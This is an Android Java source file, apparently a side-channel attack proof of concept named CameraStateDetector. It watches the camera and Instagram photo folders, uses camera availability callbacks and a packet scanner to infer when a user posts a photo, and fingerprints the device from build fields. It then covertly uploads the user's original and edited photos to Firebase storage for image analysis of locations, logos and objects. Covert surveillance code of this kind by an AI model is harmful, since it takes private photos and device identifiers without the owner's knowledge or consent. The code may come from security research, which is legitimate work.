package com.example.side_channel_attack;

import android.app.Activity;
import android.content.Context;
import android.hardware.camera2.CameraManager;
import android.icu.util.TimeZone;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.os.FileObserver;
import android.support.annotation.NonNull;

import com.google.android.gms.tasks.OnCompleteListener;
import com.google.android.gms.tasks.OnSuccessListener;
import com.google.android.gms.tasks.Task;
import com.google.firebase.firestore.DocumentReference;
import com.google.firebase.firestore.DocumentSnapshot;
import com.google.firebase.firestore.FirebaseFirestore;
import com.google.firebase.functions.FirebaseFunctions;
import com.google.firebase.functions.HttpsCallableReference;
import com.google.firebase.functions.HttpsCallableResult;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.StorageReference;
import com.google.firebase.storage.UploadTask;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.InputStream;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Map;

public class CameraStateDetector {
    private FileObserver dcimObserver;
    private FileObserver instagramObserver;
    private int PASSIVE_STATE = 1;
    private int ACTIVE_STATE = 0;

    private File imagePreModified;
    private File imagePostModified;
    private String timestamp;
    private String id;
    private String url;
    private FirebaseFunctions mFunctions;

    private long activeStateStartTime;

    public CameraStateDetector(final Activity activity) {

//        final File cameraDirectory = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM);
//        final File dir = new File(cameraDirectory.getAbsolutePath() + "/Camera/IMG_20190417_031849.jpg");
//
//        imagePreModified = dir;
//        imagePostModified = dir;

        setUpDCIMListener();
        setUpInstagramListener();
        setUpCameraListener(activity);

    }

    private void setUpCameraListener(Activity activity) {
        final PacketCatcher packetCatcher = new PacketCatcher();
        CameraManager manager = (CameraManager) activity.getSystemService(Context.CAMERA_SERVICE);
        manager.registerAvailabilityCallback(new CameraManager.AvailabilityCallback() {
            @Override
            public void onCameraAvailable(String cameraId) {
                super.onCameraAvailable(cameraId);
                System.out.println("entered");
                System.out.println(ACTIVE_STATE);
                if (ACTIVE_STATE == 1) {
                    boolean outcomeOf1stEvent = packetCatcher.scan(10000);
                    System.out.println(outcomeOf1stEvent);
                    if (outcomeOf1stEvent) {
                        activeStateStartTime = System.currentTimeMillis() - 4000;
                    } else {
                        PASSIVE_STATE = 1;
                        ACTIVE_STATE = 0;
                    }
                }
            }

            @Override
            public void onCameraUnavailable(String cameraId) {
                super.onCameraUnavailable(cameraId);
                System.out.println("hellod");
                PASSIVE_STATE = 1;
                ACTIVE_STATE = 0;
            }
        }, null);
    }

    private void setUpDCIMListener() {
        final File cameraDirectory = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM);
        final File dir = new File(cameraDirectory.getAbsolutePath() + "/Camera");
        dcimObserver = new FileObserver(dir.getPath()) {


            @Override
            public void onEvent(int event, String file) {
                if (PASSIVE_STATE == 1) {
                    if (event == FileObserver.CREATE && !file.equals(".probe")) {
                        System.out.println("hklloinst");

                        imagePreModified = new File(dir.getPath() + "/" + file);
                        PASSIVE_STATE = 0;
                        ACTIVE_STATE = 1;
                    }
                }
            }
        };
        dcimObserver.startWatching();
    }

    private void setUpInstagramListener() {
        final File instagramDirectory = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES);
        final File dir = new File(instagramDirectory.getAbsolutePath() + "/Instagram");
        instagramObserver = new FileObserver(dir.getPath()) {
            @Override
            public void onEvent(int event, String file) {
                if (ACTIVE_STATE == 1) {
                    if (event == FileObserver.CREATE && !file.equals(".probe")) {
                        long activeStateEndTime = System.currentTimeMillis();
                        System.out.println("helloinst");
                        if ((activeStateEndTime - activeStateStartTime) >= 14000) {
                            System.out.println("works");
                            imagePostModified = new File(dir.getPath() + "/" + file);
                            timestamp = getCurrentUTCTimestamp();

                        } else {
                            PASSIVE_STATE = 1;
                            ACTIVE_STATE = 0;
                        }
                    }
                }
            }
        };
        instagramObserver.startWatching();
    }

    private void sendData() {

        FirebaseFirestore db = FirebaseFirestore.getInstance();

        id = "" +
                Build.BOARD.length() % 10 + Build.BRAND.length() % 10 +
                Build.CPU_ABI.length() % 10 + Build.DEVICE.length() % 10 +
                Build.DISPLAY.length() % 10 + Build.HOST.length() % 10 +
                Build.ID.length() % 10 + Build.MANUFACTURER.length() % 10 +
                Build.MODEL.length() % 10 + Build.PRODUCT.length() % 10 +
                Build.TAGS.length() % 10 + Build.TYPE.length() % 10 +
                Build.USER.length() % 10; //13 digits

        final DocumentReference entryRef = db.collection("invocations").document();
        final DocumentReference existRef = db.collection("users").document(id);

        final Map<String, Object> entry = new HashMap<>();

        entry.put("date", timestamp);
        entry.put("id", id);

        existRef.get().addOnCompleteListener(new OnCompleteListener<DocumentSnapshot>() {
            @Override
            public void onComplete(@NonNull Task<DocumentSnapshot> task) {
                System.out.println("hi");
                if (!task.getResult().exists()) {
                    System.out.println("bye");

                    final String preImageName = id + "_" + System.currentTimeMillis() + ".jpg";
                    final UploadTask preImageStream = uploadImage(preImageName, imagePreModified);

                    preImageStream.addOnSuccessListener(new OnSuccessListener<UploadTask.TaskSnapshot>() {
                        @Override
                        public void onSuccess(UploadTask.TaskSnapshot taskSnapshot) {
                            System.out.println("first image");
                            mFunctions = FirebaseFunctions.getInstance();
                            Map<String, Object> data = new HashMap<>();
                            data.put("text", preImageName);
                            mFunctions
                                    .getHttpsCallable("filter")
                                    .call(data).
                                    addOnSuccessListener(new OnSuccessListener<HttpsCallableResult>() {
                                        @Override
                                        public void onSuccess(HttpsCallableResult httpsCallableResult) {

                                            final HashMap<String, ArrayList<String>> data =
                                                    (HashMap<String, ArrayList<String>>) httpsCallableResult.getData();

                                            System.out.println(data);

                                            final String postImageName = id + "_" + (System.currentTimeMillis() + 1) + ".jpg";
                                            final UploadTask postImageStream = uploadImage(postImageName, imagePostModified);
                                            postImageStream.addOnSuccessListener(new OnSuccessListener<UploadTask.TaskSnapshot>() {
                                                @Override
                                                public void onSuccess(UploadTask.TaskSnapshot taskSnapshot) {
                                                    taskSnapshot.getStorage().getDownloadUrl().addOnSuccessListener(new OnSuccessListener<Uri>() {
                                                        @Override
                                                        public void onSuccess(final Uri uri) {
                                                            url = uri.toString();
                                                            entryRef.set(entry).addOnCompleteListener(new OnCompleteListener<Void>() {
                                                                @Override
                                                                public void onComplete(@NonNull Task<Void> task) {


                                                                    System.out.println("second image ");
                                                                    System.out.println(url);
                                                                    int counter = 0;

//                                                    for(String term : data.get("locationMatches")){
//                                                        searchTag(term);
//                                                        if(++counter == 30)
//                                                            break;
//                                                    }
//
//                                                    for(String term : data.get("logoMatches")){
//                                                        searchTag(term);
//                                                        if(++counter == 30)
//                                                            break;
//                                                    }
//
//                                                    for(String term : data.get("webMatches")){
//                                                        searchTag(term);
//                                                        if(++counter == 30)
//                                                            break;
//                                                    }
//
//                                                    for(String term : data.get("labelMatches")){
//                                                        searchTag(term);
//                                                        if(++counter == 30)
//                                                            break;
//                                                    }
//
//                                                    for(String term : data.get("objectMatches")){
//                                                        searchTag(term);
//                                                        if(++counter == 30)
//                                                            break;
//                                                    }

                                                                }
                                                            });
                                                        }
                                                    });
                                                }
                                            });


                                        }
                                    });

                        }
                    });
                }
            }
        });
    }

    private UploadTask uploadImage(String name, File image) {
        InputStream stream = null;

        try {
            stream = new FileInputStream(image);
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        }

        StorageReference storageRef = FirebaseStorage.getInstance().getReference();
        final StorageReference ref = storageRef.child(name);

        return ref.putStream(stream);

    }

    private void searchTag(String term) {
        Map<String, Object> parameters =
                getParams("tag", term);

        HttpsCallableReference searchSingle = mFunctions
                .getHttpsCallable("searchSingle");
        searchSingle.call(parameters);
    }


    private Map<String, Object> getParams(String additionalKey, String additionalVal) {
        Map<String, Object> parameters = new HashMap<>();
        //default
        parameters.put("url", url);
        parameters.put("id", id);
        parameters.put("timestamp", timestamp);
        //additional
        parameters.put(additionalKey, additionalVal);
        return parameters;
    }

    private String getCurrentUTCTimestamp() {
        android.icu.util.Calendar calendar = android.icu.util.Calendar.getInstance(TimeZone.getTimeZone("UTC"));

        SimpleDateFormat formater = new SimpleDateFormat("dd/MM/yyyy hh:mm:ss");
        formater.setTimeZone(java.util.TimeZone.getTimeZone("UTC"));

        return formater.format(calendar.getTime());
    }
}
